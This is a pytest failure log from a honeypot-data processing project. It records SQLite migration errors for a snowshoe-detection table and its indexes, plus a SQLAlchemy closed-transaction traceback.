            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,496:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,498:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:39,509:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______ TestQuarantinePayloadFix.test_dead_letter_events_preserve_content _______

self = <test_quarantine_payload_fix.TestQuarantinePayloadFix object at 0x7756b3d28770>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_dead_letter_events_preser0')

    def test_dead_letter_events_preserve_content(self, tmp_path: Path) -> None:
        """Test that dead letter events preserve their original content."""
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:103: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:28: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566f473930>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,052:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,062:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
